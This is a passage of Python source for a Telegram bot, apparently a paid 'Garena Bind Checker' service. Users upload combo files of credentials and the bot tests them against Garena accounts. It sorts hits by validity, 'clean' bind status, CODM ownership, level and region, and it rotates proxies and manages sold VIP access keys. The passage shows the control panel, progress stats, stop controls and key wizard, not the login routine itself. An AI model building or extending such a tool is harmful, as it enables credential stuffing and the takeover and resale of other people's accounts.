            f"📡 Proxy pool now: <code>{pool_now}</code>\n\n"
            f"<b>Errors:</b>\n{err_str}")
    else:
        _tg_send(token, chat_id,
            f"✅ <b>Proxy Renewal Complete!</b>\n\n"
            f"🗑️ Old proxies deleted: <code>{old_count}</code>\n"
            f"🔄 Fetched from: <code>{worker_url}</code>\n"
            f"✅ New proxies added: <code>{len(new_proxies)}</code>\n"
            f"📡 Proxy pool now: <code>{pool_now}</code>\n\n"
            f"🔒 Worker-only mode ON — background auto-fetch paused.\n"
            f"Use <code>/deleteproxy</code> to re-enable auto-fetch.")


def _handle_check(token: str, chat_id, from_user: dict, sub_cmd: str = ""):
    """
    /check         — full overview (level + country + server)
    /check level   — level distribution only
    /check country — country distribution only
    /check server  — server/region distribution only
    """
    # Find the user's active checker live_stats
    bar = _active_bars.get(chat_id, {})
    ls = bar.get("live_stats")

    if not ls:
        _tg_send(token, chat_id,
            "ℹ️ <b>No active checker running.</b>\n\n"
            "Start a checker first, then use /check to see live stats.")
        return

    with ls.lock:
        done = ls.total_processed
        total = ls.total_accounts
        pct = (done / total * 100) if total > 0 else 0
        speed_str = f"{ls.current_speed:.1f}/s" if ls.current_speed > 0 else "..."
        eta_str = ls.format_time(ls.eta_seconds) if ls.eta_seconds else "N/A"
        elapsed_str = ls.format_time(time.time() - ls.start_time) if ls.start_time else "0s"

        level_dist = dict(ls.level_distribution)
        server_dist = dict(ls.server_distribution)
        country_dist = dict(ls.country_distribution)
        valid = ls.valid_count
        invalid = ls.invalid_count
        clean = ls.clean_count
        not_clean = ls.not_clean_count
        has_codm = ls.has_codm_count
        no_codm = ls.no_codm_count

    sub = sub_cmd.lower().strip()

    # ── Header (always shown) ──────────────────────────────
    header = (
        f"📊 <b>Checker Status</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"⏳ Progress: <code>{done:,}/{total:,}</code> ({pct:.1f}%)\n"
        f"⚡ Speed: <code>{speed_str}</code> | ETA: <code>{eta_str}</code>\n"
        f"🕐 Elapsed: <code>{elapsed_str}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ Valid: <code>{valid:,}</code> | ❌ Invalid: <code>{invalid:,}</code>\n"
        f"✨ Clean: <code>{clean:,}</code> | ⚠️ Not Clean: <code>{not_clean:,}</code>\n"
        f"🎮 CODM: <code>{has_codm:,}</code> | 📭 No CODM: <code>{no_codm:,}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
    )

    sections = []

    # ── Level Distribution ──────────────────────────────────
    if sub in ("", "level", "lvl"):
        total_with_level = sum(level_dist.values())
        if total_with_level > 0:
            lvl_lines = ["📊 <b>Level Distribution</b>"]
            for rk in ["1-50", "51-100", "101-150", "151-200",
                        "201-250", "251-300", "301-350", "351+"]:
                cnt = level_dist.get(rk, 0)
                p = (cnt / total_with_level * 100) if total_with_level > 0 else 0
                bar_str = _text_bar(cnt, total_with_level, 10)
                lvl_lines.append(f"  {rk:<7} : [{bar_str}] {cnt} ({p:.1f}%)")
            sections.append("\n".join(lvl_lines))
        elif sub in ("level", "lvl"):
            sections.append("📊 <i>No level data yet.</i>")

    # ── Country Distribution ────────────────────────────────
    if sub in ("", "country"):
        if country_dist:
            sorted_c = sorted(country_dist.items(), key=lambda x: x[1], reverse=True)
            total_c = sum(v for _, v in sorted_c)
            c_lines = ["🌍 <b>Country Distribution</b>"]
            for cname, cnt in sorted_c[:20]:
                p = (cnt / total_c * 100) if total_c > 0 else 0
                bar_str = _text_bar(cnt, total_c, 10)
                c_lines.append(f"  {cname:<5} : [{bar_str}] {cnt} ({p:.1f}%)")
            if len(sorted_c) > 20:
                others = sum(v for _, v in sorted_c[20:])
                c_lines.append(f"  Other : {others} ({others/total_c*100:.1f}%)")
            sections.append("\n".join(c_lines))
        elif sub == "country":
            sections.append("🌍 <i>No country data yet.</i>")

    # ── Server/Region Distribution ──────────────────────────
    if sub in ("", "server", "region"):
        if server_dist:
            sorted_s = sorted(server_dist.items(), key=lambda x: x[1], reverse=True)
            total_s = sum(v for _, v in sorted_s)
            s_lines = ["🌏 <b>Server Distribution</b>"]
            for region, cnt in sorted_s:
                p = (cnt / total_s * 100) if total_s > 0 else 0
                bar_str = _text_bar(cnt, total_s, 10)
                s_lines.append(f"  {region:<5} : [{bar_str}] {cnt} ({p:.1f}%)")
            sections.append("\n".join(s_lines))
        elif sub in ("server", "region"):
            sections.append("🌏 <i>No server data yet.</i>")

    body = header
    if sections:
        body += "\n".join(sections)
    else:
        body += "<i>No distribution data yet — check back after more accounts are processed.</i>"

    body += (
        f"\n━━━━━━━━━━━━━━━━━━━━\n"
        f"<i>💡 /check level · /check country · /check server</i>"
    )

    _tg_send(token, chat_id, body)


def _text_bar(value: int, maximum: int, width: int = 10) -> str:
    """Generate a simple text bar like ███░░░░░░░"""
    if maximum <= 0:
        return "░" * width
    filled = int(value / maximum * width)
    return "█" * filled + "░" * (width - filled)


# ── update router ──────────────────────────────────────────────
# ── /help ──────────────────────────────────────────────────────
def _handle_help(token: str, chat_id, from_user: dict):
    name = from_user.get("first_name", "User")

    if _is_owner(from_user):
        # ── Owner admin panel ──────────────────────────────────
        keys      = _load_keys()
        total_keys = len(keys)
        active_keys = sum(
            1 for k in keys.values()
            if time.time() < k.get("expires", 0)
        )
        used_keys = sum(1 for k in keys.values() if k.get("used_by"))

        total_users = len({v.get("hits_id") for v in _saved_users.values() if isinstance(v, dict) and "hits_id" in v})
        active_users = len([c for c, s in _bot_state.items() if s == "RUNNING"])

        proxy_total = geo_rotator.total

        _tg_send_buttons(token, chat_id,
            f"⚙️ <b>Admin Panel</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👥 <b>Users:</b> {total_users}  (Active: {active_users})\n"
            f"📡 <b>Proxies:</b> {proxy_total} loaded\n"
            f"🔑 <b>Keys:</b> {total_keys} total · {active_keys} active · {used_keys} used\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<i>by @Yukiii_ii</i>",
            [
                [
                    {"text": "🔑 Generate Key",  "callback_data": "admin:genkey"},
                    {"text": "📋 Key Status",    "callback_data": "admin:statuskey"},
                ],
                [
                    {"text": "🗑 Delete Keys",   "callback_data": "admin:deletekey_menu"},
                    {"text": "📡 Proxy Status",  "callback_data": "admin:proxystatus"},
                ],
                [
                    {"text": "📤 Upload Proxy",    "callback_data": "admin:upload_proxy"},
                    {"text": "🔄 Refresh Panel",   "callback_data": "admin:refresh"},
                ],
                [
                    {"text": "🗑️ Delete Proxies",  "callback_data": "admin:deleteproxy"},
                    {"text": "🔄 Renew Proxies",   "callback_data": "admin:renewproxy"},
                ],
                [
                    {"text": "📊 Server Status",   "callback_data": "admin:serverstatus"},
                    {"text": "🧵 Set Threads",     "callback_data": "admin:setthreads"},
                ],
                [
                    {"text": "👥 Set Max Users",    "callback_data": "admin:setmaxusers"},
                ],
            ]
        )

    else:
        # ── Regular user help — menu with inline buttons ───────
        d          = _udata(chat_id)
        key        = d.get("key")
        key_exp    = d.get("key_expires", 0)
        has_access = bool(key and time.time() < key_exp)

        if has_access:
            remaining = int(key_exp - time.time())
            hrs  = remaining // 3600
            mins = (remaining % 3600) // 60
            access_line = f"✅ <b>Access:</b> Valid — expires in {hrs}h {mins}m\n"
        else:
            access_line = "🔒 <b>Access:</b> No active key\n"

        lvl_label = "ALL" if d.get("level") == [1] else (
            f"Level {d['level'][0]}+" if d.get("level") else "—"
        )
        cf_map   = {"clean": "✅ CLEAN only", "notclean": "❌ NOT CLEAN only", "both": "🔄 BOTH"}
        cf_label = cf_map.get(d.get("clean_filter", ""), "—")
        is_vip = _is_vip_user(chat_id)
        limit_disp = "∞ unlimited" if is_vip else f"{d.get('combo_limit', COMBO_LINE_LIMIT)} lines"
        vip_badge = " ⭐ VIP" if is_vip else ""

        _tg_send_buttons(token, chat_id,
            f"🤖 <b>Garena Bind Checker</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"👋 Hey, <b>{name}</b>!{vip_badge}\n\n"
            f"{access_line}"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📋 <b>Your Config:</b>\n"
            f"  🆔 Hits ID:  <code>{d.get('hits_id', '—')}</code>\n"
            f"  🎮 Level:    <code>{lvl_label}</code>\n"
            f"  🔍 Hit type: <code>{cf_label}</code>\n"
            f"  📦 Limit:    <code>{limit_disp}</code>\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<i>by @Yukiii_ii</i>",
            [
                [
                    {"text": "▶️ Start / Resume",  "callback_data": "user:start"},
                    {"text": "🔄 Reset Settings",  "callback_data": "user:reset"},
                ],
                [
                    {"text": "🔑 Redeem Key",       "callback_data": "user:redeem"},
                    {"text": "🛑 Stop Checker",     "callback_data": "user:stop"},
                ],
                [
                    {"text": "🔄 Refresh",          "callback_data": "user:refresh_help"},
                ],
            ]
        )


def _build_stop_keyboard(include_stop_all: bool = True) -> tuple:
    """
    Build a stop panel keyboard showing every currently running checker.
    Returns (text, buttons).
    """
    now_running = {
        cid: evt
        for cid, evt in _stop_events.items()
        if not evt.is_set()
    }

    if not now_running:
        return (
            "ℹ️ <b>No checkers running right now.</b>",
            []
        )

    rows   = []
    lines  = [
        "🛑 <b>Stop Checker</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🏃 <b>{len(now_running)}</b> checker(s) currently running:\n"
    ]

    for cid in now_running:
        bar = _active_bars.get(cid, {})
        done  = bar.get("done",  0)
        total = bar.get("total", 0)
        pct   = f"{done/total*100:.1f}%" if total else "—"
        # Show username if saved, else just the ID
        saved = _get_saved_profile(str(cid))
        uname = saved.get("username", "") if saved else ""
        label = f"@{uname}" if uname else f"id:{cid}"
        lines.append(f"  • {label} — {done}/{total} ({pct})")
        rows.append([{
            "text":          f"🛑 Stop {label} ({pct})",
            "callback_data": f"stop_user:{cid}",
        }])

    if include_stop_all and len(now_running) > 1:
        rows.append([{
            "text":          f"☢️ Stop ALL ({len(now_running)} users)",
            "callback_data": "stop_all",
        }])

    rows.append([{"text": "❌ Cancel", "callback_data": "stop_cancel"}])

    return "\n".join(lines), rows


def _handle_stop_panel(token: str, chat_id, from_user: dict):
    """Show the interactive stop panel. Owner sees all users; regular user sees only self."""
    if _is_owner(from_user):
        text, kb = _build_stop_keyboard(include_stop_all=True)
        if kb:
            _tg_send_buttons(token, chat_id, text, kb)
        else:
            _tg_send(token, chat_id, text)
    else:
        # Regular user — only show their own checker
        evt = _stop_events.get(chat_id)
        if evt and not evt.is_set():
            bar   = _active_bars.get(chat_id, {})
            done  = bar.get("done",  0)
            total = bar.get("total", 0)
            pct   = f"{done/total*100:.1f}%" if total else "—"
            # Try to get enhanced fancy progress from live_stats
            ls = bar.get("live_stats")
            progress_text = ""
            if ls:
                tp = ls.get_fancy_telegram_progress()
                if not tp:
                    tp = ls.get_telegram_progress()
                if tp:
                    progress_text = f"\n\n{tp}"
            _tg_send_buttons(token, chat_id,
                f"🛑 <b>Your checker is running</b>\n\n"
                f"📊 Progress: <code>{done}/{total}</code> ({pct}){progress_text}\n\n"
                f"Tap below to stop it:",
                [
                    [{"text": f"🛑 Stop my checker ({pct})", "callback_data": f"stop_user:{chat_id}"}],
                    [{"text": "❌ Keep running",              "callback_data": "stop_cancel"}],
                ]
            )
        else:
            _tg_send(token, chat_id, "ℹ️ <b>No checker is currently running.</b>")


def _handle_callback_query(token: str, cq: dict):
    """Handle all inline button presses."""
    cq_id     = cq["id"]
    from_user = cq.get("from", {})
    message   = cq.get("message")
    data      = cq.get("data", "")

    # Always answer the callback FIRST to remove loading spinner
    # Fire in a background thread so it's never delayed by handler logic
    threading.Thread(
        target=_tg_answer_callback,
        args=(token, cq_id),
        daemon=True
    ).start()

    if not message:
        logger.warning(f"[BOT] Callback query with no message — cq_id={cq_id} data={data!r}")
        return
    chat_id = message["chat"]["id"]
    logger.info(f"[BOT] 🔘 callback data={data!r} from={from_user.get('id')} chat={chat_id}")

    # ── Admin panel button routing ─────────────────────────────
    if data == "admin:genkey":
        if not _is_owner(from_user): return
        _genkey_wizard[chat_id] = {"step": "AWAIT_TIER"}
        _tg_send_buttons(token, chat_id,
            "🔑 <b>Generate Key — Step 1 of 6</b>\n\n"
            "🏷 <b>Select Tier:</b>\n\n"
            "<i>Free = basic access  |  VIP = premium access + more threads</i>",
            [
                [
                    {"text": "🆓 Free",  "callback_data": "gk_tier:free"},
                    {"text": "⭐ VIP",   "callback_data": "gk_tier:vip"},
                ],
                [
                    {"text": "❌ Cancel", "callback_data": "gk_cancel"},
                ],
            ]
        )
        return

    if data == "admin:statuskey":
        if not _is_owner(from_user): return
        _handle_status_key(token, chat_id, from_user, "")
        return

    if data == "admin:deletekey_menu":
        if not _is_owner(from_user): return
        keys = _load_keys()
        now  = time.time()
        if not keys:
            _tg_send(token, chat_id, "📭 <b>No keys found.</b>")
            return
        _deletekey_selection[chat_id] = set()
        kb = _build_deletekey_keyboard(keys, set(), now)
        _tg_send_buttons(token, chat_id,
            _deletekey_header(keys, set(), now), kb)
        return

    if data == "admin:serverstatus":
        if not _is_owner(from_user): return
        _handle_server_status(token, chat_id, from_user)
        return

    if data == "admin:setthreads":
        if not _is_owner(from_user): return
        _handle_set_threads(token, chat_id, from_user, "")
        return

    if data == "admin:setmaxusers":
        if not _is_owner(from_user): return
        _handle_set_max_users(token, chat_id, from_user, "")
        return

    if data == "admin:proxystatus":
        if not _is_owner(from_user): return
        _handle_proxy_status(token, chat_id, from_user)
        return

    if data == "admin:upload_proxy":
        if not _is_owner(from_user): return
        _proxy_accumulator.pop(chat_id, None)   # clear any old session
        _proxy_msg_ids.pop(chat_id, None)
        _bot_state[chat_id] = "AWAIT_PROXY"
        _handle_proxy_upload(token, chat_id, from_user, {})
        return

    if data == "admin:deleteproxy":
        if not _is_owner(from_user): return
        _handle_delete_proxy(token, chat_id, from_user)
        return

    if data == "admin:renewproxy":
        if not _is_owner(from_user): return
        def _run_renew_cb():
            _handle_renew_proxy(token, chat_id, from_user)
        threading.Thread(target=_run_renew_cb, daemon=True).start()
        return

    if data == "admin:refresh":
        if not _is_owner(from_user): return
        _handle_help(token, chat_id, from_user)
        return

    # ── deletekey picker: toggle a single key ──────────────────
    if data.startswith("dk_toggle:"):
        if not _is_owner(from_user): return
        key_name = data[len("dk_toggle:"):]
        sel  = _deletekey_selection.setdefault(chat_id, set())
        if key_name in sel:
            sel.discard(key_name)
        else:
            sel.add(key_name)
        keys = _load_keys()
        now  = time.time()
        kb   = _build_deletekey_keyboard(keys, sel, now)
        _tg_edit_message(token, chat_id, message["message_id"],
            _deletekey_header(keys, sel, now), kb)
        return

    # ── deletekey picker: bulk-select helpers ──────────────────
    if data.startswith("dk_sel:"):
        if not _is_owner(from_user): return
        action = data[len("dk_sel:"):]
        keys   = _load_keys()
        now    = time.time()
        sel    = _deletekey_selection.setdefault(chat_id, set())
        if action == "expired":
            sel |= {k for k, v in keys.items() if now >= v.get("expires", 0)}
        elif action == "unused":
            def _is_unused(v):
                ub = v.get("used_by", [])
                if isinstance(ub, str): return not ub
                return len(ub) == 0
            sel |= {k for k, v in keys.items() if _is_unused(v)}
        elif action == "all":
            sel |= set(keys.keys())
        elif action == "none":
            sel.clear()
        kb = _build_deletekey_keyboard(keys, sel, now)
        _tg_edit_message(token, chat_id, message["message_id"],
            _deletekey_header(keys, sel, now), kb)
        return

    # ── deletekey picker: confirm deletion ─────────────────────
    if data == "dk_confirm":
        if not _is_owner(from_user): return
        sel  = _deletekey_selection.pop(chat_id, set())
        if not sel:
            _tg_answer_callback(token, cq_id, "⚠️ No keys selected!")
            return
        keys    = _load_keys()
        deleted = []
        for k in list(sel):
            if k in keys:
                _delete_key_from_api(keys[k])
                deleted.append(k)
                del keys[k]
        _save_keys(keys)
        lines = [f"🗑 <b>Deleted {len(deleted)} key(s)</b>\n"
                 f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"]
        for k in deleted:
            lines.append(f"  🔑 <code>{k}</code>")
        lines.append(f"\n📊 <b>Remaining keys: {len(keys)}</b>")
        _tg_edit_message(token, chat_id, message["message_id"],
            "\n".join(lines), [])
        return

    # ── deletekey picker: cancel ───────────────────────────────
    if data == "dk_cancel":
        if not _is_owner(from_user): return
        _deletekey_selection.pop(chat_id, None)
        _tg_edit_message(token, chat_id, message["message_id"],
            "❌ <b>Delete cancelled.</b> No keys were removed.", [])
        return

    # ── deletekey noop (info button) ───────────────────────────
    if data == "dk_noop":
        return

    # ── Genkey wizard — Tier selected → ask Format ──────────────
    if data.startswith("gk_tier:"):
        if not _is_owner(from_user): return
        tier = data.split(":")[1]
        _genkey_wizard[chat_id] = {"step": "AWAIT_FORMAT", "tier": tier}
        _ask_genkey_format(token, chat_id)
        return

    # ── Genkey wizard — Format selected → ask Expiry ──────────
    if data.startswith("gk_fmt:"):
        if not _is_owner(from_user): return
        wiz = _genkey_wizard.get(chat_id, {})
        if not wiz or wiz.get("step") != "AWAIT_FORMAT":
            _tg_send(token, chat_id, "⚠️ Session expired. Use /generate_key again.")
            return
        wiz["format"] = data.split(":")[1]
        wiz["step"] = "AWAIT_EXPIRY"
        _ask_genkey_expiry(token, chat_id)
        return

    # ── Genkey wizard — Expiry (days) selected → ask Combo Limit
    if data.startswith("gk_exp:"):
        if not _is_owner(from_user): return
        wiz = _genkey_wizard.get(chat_id, {})
        if not wiz or wiz.get("step") != "AWAIT_EXPIRY":
            _tg_send(token, chat_id, "⚠️ Session expired. Use /generate_key again.")
            return
        wiz["expiry_days"] = int(data.split(":")[1])
        wiz["expiry_seconds"] = wiz["expiry_days"] * 86400
        wiz["step"] = "AWAIT_COMBO"
        _ask_genkey_combo(token, chat_id)
        return

    # ── Genkey wizard — Expiry (hours) selected → ask Combo Limit
    if data.startswith("gk_exp_h:"):
        if not _is_owner(from_user): return
        wiz = _genkey_wizard.get(chat_id, {})
        if not wiz or wiz.get("step") != "AWAIT_EXPIRY":
            _tg_send(token, chat_id, "⚠️ Session expired. Use /generate_key again.")
            return
        hours = int(data.split(":")[1])
        wiz["expiry_seconds"] = hours * 3600
        wiz["expiry_days"] = 0  # sub-day
        wiz["step"] = "AWAIT_COMBO"
        _ask_genkey_combo(token, chat_id)
        return

    # ── Genkey wizard — Combo selected → ask Max Redemptions ──
    if data.startswith("gk_lim:"):
        if not _is_owner(from_user): return
        wiz = _genkey_wizard.get(chat_id, {})
        if not wiz or wiz.get("step") != "AWAIT_COMBO":
            _tg_send(token, chat_id, "⚠️ Session expired. Use /generate_key again.")
            return
        wiz["combo_limit"] = int(data.split(":")[1])
        wiz["step"] = "AWAIT_REDEEMS"
        _ask_genkey_redeems(token, chat_id)
        return

    # ── Genkey wizard — Redeems selected → ask Count ──────────
    if data.startswith("gk_usr:"):
        if not _is_owner(from_user): return
        wiz = _genkey_wizard.get(chat_id, {})
        if not wiz or wiz.get("step") != "AWAIT_REDEEMS":
            _tg_send(token, chat_id, "⚠️ Session expired. Use /generate_key again.")
            return
        wiz["max_redemptions"] = int(data.split(":")[1])
        wiz["step"] = "AWAIT_COUNT"
        _ask_genkey_count(token, chat_id)
        return

    # ── Genkey wizard — Count chosen → finalize ───────────────
    if data.startswith("gk_cnt:"):
        if not _is_owner(from_user): return
        wiz = _genkey_wizard.get(chat_id, {})
        if not wiz or wiz.get("step") != "AWAIT_COUNT":
            _tg_send(token, chat_id, "⚠️ Session expired. Use /generate_key again.")
            return
        count = int(data.split(":")[1])
        _finalize_gen_key(
            token, chat_id,
            tier=wiz.get("tier", "vip"),
            key_format=wiz.get("format", "alphanum"),
            expiry_days=wiz.get("expiry_days", 30),
            combo_limit=wiz.get("combo_limit", 1000),
            max_redemptions=wiz.get("max_redemptions", 1),
            count=count,
            label=wiz.get("label", ""),
            expiry_seconds=wiz.get("expiry_seconds", 0),
        )
        return

    # ── Cancel genkey wizard ───────────────────────────────────
    if data == "gk_cancel":
        _genkey_wizard.pop(chat_id, None)
        _tg_send(token, chat_id, "❌ Key generation cancelled.")
        return

    # ── User menu buttons ──────────────────────────────────────
    if data == "user:start":
        if not _check_access(token, chat_id, from_user):
            return
        _handle_start(token, chat_id, from_user)
        return

    if data == "user:reset":
        key_id = str(from_user.get("id", chat_id))
        uname  = from_user.get("username", "")
        _saved_users.pop(key_id, None)
        if uname:
            _saved_users.pop(uname.lstrip("@").lower(), None)
        _save_users_to_disk()
        _user_data.pop(chat_id, None)
        _bot_state.pop(chat_id, None)
        _tg_send(token, chat_id,
            "🗑 <b>Settings cleared!</b>\n\n"
            "Send /start or tap Start to reconfigure.")
        return

    if data == "user:stop":
        _handle_stop_panel(token, chat_id, from_user)
        return

    # ── Stop: stop a specific user's checker ───────────────────
    if data.startswith("stop_user:"):
        if not _is_owner(from_user):
            # Non-owner can only stop their own
            target_id = int(data.split(":")[1])
            if target_id != chat_id:
                _tg_answer_callback(token, cq_id, "🚫 You can only stop your own checker.")
                return
        else:
            target_id = int(data.split(":")[1])

        # Also clear proxy-paused state if they're waiting
        _unregister_proxy_paused(target_id)
        evt = _stop_events.get(target_id)
        if evt and not evt.is_set():
            evt.set()
            saved = _get_saved_profile(str(target_id))
            uname = saved.get("username", "") if saved else ""
            label = f"@{uname}" if uname else f"id:{target_id}"
            _tg_edit_message(token, chat_id, message["message_id"],
                f"🛑 <b>Stop signal sent to {label}!</b>\n\n"
                f"The checker will stop after the current batch finishes.",
                []
            )
        else:
            _tg_answer_callback(token, cq_id, "ℹ️ That checker already stopped.")
            _tg_edit_message(token, chat_id, message["message_id"],
                "ℹ️ <b>That checker has already finished or stopped.</b>", [])
        return

    # ── Stop: stop ALL running checkers ───────────────────────
    if data == "stop_all":
        if not _is_owner(from_user):
            _tg_answer_callback(token, cq_id, "🚫 Owner only.")
            return
        stopped_count = 0
        for target_id, evt in list(_stop_events.items()):
            if not evt.is_set():
                evt.set()
                stopped_count += 1
        _tg_edit_message(token, chat_id, message["message_id"],
            f"☢️ <b>Stop ALL sent!</b>\n\n"
            f"Sent stop signal to <b>{stopped_count}</b> running checker(s).\n"
            f"They will stop after their current batch finishes.",
            []
        )
        return

    # ── Stop: cancel (dismiss panel) ──────────────────────────
    if data == "stop_cancel":
        _tg_edit_message(token, chat_id, message["message_id"],
            "✅ <b>Cancelled.</b> Checkers keep running.", [])
        return

    if data == "user:redeem":
        _tg_send(token, chat_id,
            "🔑 <b>Redeem Key</b>\n\n"
            "Type your key:\n<code>/redeem YOUR_KEY</code>")
        return

    if data == "user:refresh_help":
        _handle_help(token, chat_id, from_user)
        return

    # ── Redeem: prompt button ──────────────────────────────────
    if data == "redeem:prompt":
        _bot_state[chat_id] = "AWAIT_REDEEM_KEY"
        _tg_send(token, chat_id,
            "🔑 <b>Enter your key:</b>\n\n"
            "<code>/redeem YOUR_KEY_HERE</code>\n\n"
            "<i>Just type it and send!</i>")
        return

    # ── Level picker button ────────────────────────────────────
    if data.startswith("lvl:"):
        if not _check_access(token, chat_id, from_user): return
        val = data[4:]
        level_map = {
            "100": ([100], "Level 100+"),
            "200": ([200], "Level 200+"),
            "300": ([300], "Level 300+"),
            "400": ([400], "Level 400+"),
            "all": ([1],   "ALL levels"),
        }
        if val not in level_map: return
        thresholds, label = level_map[val]
        d = _udata(chat_id)
        d["level"] = thresholds
        _save_profile(chat_id, d)  # auto-save level immediately
        _ask_filter(token, chat_id, label)
        return

    # ── Filter picker button ───────────────────────────────────
    if data.startswith("flt:"):
        if not _check_access(token, chat_id, from_user): return
        val = data[4:]
        filter_map = {
            "clean":    ("clean",    "✅ CLEAN only"),
            "notclean": ("notclean", "❌ NOT CLEAN only"),
            "both":     ("both",     "🔄 BOTH"),
        }
        if val not in filter_map: return
        cf_value, cf_label = filter_map[val]
        d = _udata(chat_id)
        d["clean_filter"] = cf_value
        _bot_state[chat_id] = "AWAIT_FILE"
        _save_profile(chat_id, d)
        lvl_label  = "ALL levels" if d.get("level") == [1] else f"Level {d.get('level', [1])[0]}+"
        user_limit = d.get("combo_limit", COMBO_LINE_LIMIT)
        _tg_send(token, chat_id,
            f"✅ <b>Config saved!</b>\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"  🆔 Hits ID:  <code>{d.get('hits_id', chat_id)}</code>\n"
            f"  🎮 Level:    <code>{lvl_label}</code>\n"
            f"  🔍 Hit type: <code>{cf_label}</code>\n"
            f"  📦 Limit:    <code>{user_limit} lines</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📂 <b>Upload your combo file to start!</b>\n\n"
            f"<i>Use /reset to change settings.</i>\n\n"
            f"<i>Send your file now ⬇️</i>"
        )
        return

    # ── Proxy accumulator buttons ──────────────────────────────
    if data == "proxy:done":
        if not _is_owner(from_user): return
        _flush_proxy_accumulator(token, chat_id)
        return

    if data == "proxy:cancel":
        if not _is_owner(from_user): return
        msg_ids = _proxy_msg_ids.pop(chat_id, [])
        _proxy_accumulator.pop(chat_id, None)
        _bot_state.pop(chat_id, None)
        # Delete all pasted messages and bot replies
        if msg_ids:
            _tg_delete_messages_bulk(token, chat_id, msg_ids)
        _tg_send(token, chat_id, "🗑 <b>Proxy upload cancelled.</b> Accumulator cleared.")
        return

    # ── Broadcast callback buttons ──────────────────────────────────────────
    if data == "broadcast:done":
        if not _is_owner(from_user): return
        _flush_broadcast_accumulator(token, chat_id, from_user)
        return

    if data == "broadcast:cancel":
        if not _is_owner(from_user): return
        _broadcast_accumulator.pop(chat_id, None)
        _bot_state.pop(chat_id, None)
        _tg_send(token, chat_id, "🗑 <b>Broadcast cancelled.</b> Message discarded.")
        return


def _send_broadcast(token: str, chat_id, from_user: dict, message_text: str):
    """Send a broadcast message to all registered bot users."""
    target_ids = set()
    for k, v in _saved_users.items():
        if isinstance(v, dict):
            _cid = v.get("hits_id")
            if _cid:
                try:
                    target_ids.add(int(_cid))
                except (ValueError, TypeError):
                    pass
    # Also add chat_ids from _user_data (in case not yet saved)
    for _cid in _user_data:
        try:
            target_ids.add(int(_cid))
        except (ValueError, TypeError):
            pass
    # Remove owner from targets
    try:
        owner_id = int(OWNER_ID) if OWNER_ID else None
        if owner_id: target_ids.discard(owner_id)
    except (ValueError, TypeError):
        pass
    if not target_ids:
        _tg_send(token, chat_id, "📢 <b>No users to broadcast to.</b>")
        return
    owner_name = from_user.get("first_name", "Owner")
    broadcast_msg = (
        f"📢 <b>Announcement from {owner_name}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{message_text}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"<i>— Bot Admin</i>"
    )
    sent_ok, sent_fail = 0, 0
    for tid in target_ids:
        try:
            _tg_send(token, tid, broadcast_msg)
            sent_ok += 1
            time.sleep(0.05)  # rate-limit: ~20 msg/sec
        except Exception:
            sent_fail += 1
    _tg_send(token, chat_id,
        f"📢 <b>Broadcast Complete!</b>\n\n"
        f"✅ <b>Delivered:</b> {sent_ok}\n"
        f"❌ <b>Failed:</b> {sent_fail}\n"
        f"👥 <b>Total users:</b> {len(target_ids)}")


def _flush_broadcast_accumulator(token: str, chat_id, from_user: dict):
    """Send the accumulated broadcast message to all users and clean up."""
    lines = _broadcast_accumulator.pop(chat_id, [])
    _bot_state.pop(chat_id, None)
    if not lines:
        _tg_send(token, chat_id,
            "⚠️ <b>No message to broadcast.</b>\n"
            "Type your message first, then tap Done.")
        return
    message_text = "\n".join(lines)
    _send_broadcast(token, chat_id, from_user, message_text)


def handle_bot_update(token: str, update: dict, _unused_config):
    try:
        _handle_bot_update_inner(token, update, _unused_config)
    except Exception as e:
        logger.error(f"[BOT] ❌ Unhandled error in update handler: {e}", exc_info=True)
        try:
            chat_id = (update.get("message") or update.get("callback_query", {}).get("message") or {}).get("chat", {}).get("id")
            if chat_id:
                _tg_send(token, chat_id, "⚠️ An error occurred. Please try again.")
        except Exception:
            pass


def _parse_command(text: str):
    """
    Parse a Telegram command from text.
    Returns (command, args) tuple. Command is lowercase without @botname suffix.
    e.g. '/start@MyBot hello' -> ('start', 'hello')
         '/generate_key 1d'   -> ('generate_key', '1d')
         'hello'              -> ('', 'hello')
    """
    if not text or not text.startswith("/"):
        return ("", text)
    parts = text.split(None, 1)  # split on first whitespace
    cmd_part = parts[0].lower()   # e.g. '/start@mybot'
    args = parts[1] if len(parts) > 1 else ""
    # Strip the leading '/' and any @botname suffix
    cmd_part = cmd_part[1:]  # remove '/'
    if "@" in cmd_part:
        cmd_part = cmd_part.split("@")[0]
    return (cmd_part, args.strip())


def _handle_bot_update_inner(token: str, update: dict, _unused_config):
    # ── Inline button presses ──────────────────────────────────
    if update.get("callback_query"):
        _handle_callback_query(token, update["callback_query"])
        return

    msg = update.get("message") or update.get("edited_message")
    if not msg:
        return

    chat_id   = msg["chat"]["id"]
    from_user = msg.get("from", {})
    text      = msg.get("text", "").strip()
    cmd, cmd_args = _parse_command(text)

    if cmd:
        logger.info(f"[BOT] 📩 cmd={cmd!r} args={cmd_args!r} from={from_user.get('id')} chat={chat_id}")

    # ── Intercept text replies for genkey wizard ───────────────
    if _is_owner(from_user) and chat_id in _genkey_wizard:
        wiz = _genkey_wizard[chat_id]
        # Custom expiry input (e.g. "1d", "12h", "2w 3d", "1mo", "6h30m")
        if wiz["step"] == "AWAIT_EXPIRY" and text and not text.startswith("/"):
            secs = _parse_duration(text)
            if secs > 0:
                wiz["expiry_seconds"] = secs
                wiz["expiry_days"] = secs // 86400 if secs >= 86400 else 0
                wiz["step"] = "AWAIT_COMBO"
                _ask_genkey_combo(token, chat_id)
            elif text.strip() == "0" or text.strip().lower() == "never":
                wiz["expiry_seconds"] = 0
